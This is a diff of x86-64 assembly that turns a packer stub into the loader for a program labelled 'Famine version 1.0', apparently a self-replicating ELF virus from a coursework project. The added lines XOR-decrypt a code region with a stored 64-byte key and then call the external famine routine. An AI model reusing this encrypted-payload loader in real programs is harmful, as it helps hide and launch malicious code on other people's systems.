@@ -1,7 +1,11 @@
 global xor_cipher
 global woody_mod
+global key_loc
 
-extern woody_mod_c
+extern famine
+extern syscall_wrapper
+
+%define KEY_SIZE 64
 
 section .text
 
@@ -15,20 +19,14 @@ woody_mod:
 	push	r10
 
 xor_cipher_params:
-	lea	rdi, [rel woody_str_end + 2]
+	lea	rdi, [rel key_loc]
 	mov	rsi, 0xBBBBBBBBBBBBBBBB
-	lea	rdx, [rel woody_mod - 0x22222201]
+	lea	rdx, [rel syscall_wrapper]
 	mov	rcx, 0xCCCCCCCCCCCCCCCC
 	call	xor_cipher
 
-print_woody:
-	mov	rax, 1
-	mov	rdi, 1
-	lea	rsi, [rel woody_str]
-	mov	rdx, woody_str_end - woody_str - 1
-	syscall
-
 exit:
+	call famine
 	pop	r10
 	pop	r9
 	pop	r8
@@ -75,4 +73,5 @@ xor_cipher_end:
 align 8
 
 woody_str	db "Famine version 1.0 (c)oded by vsteffen", 0x0a, 0
-woody_str_end	db 0x0
+key_loc:	times KEY_SIZE db 0
+woody_mod_end	db 0x0
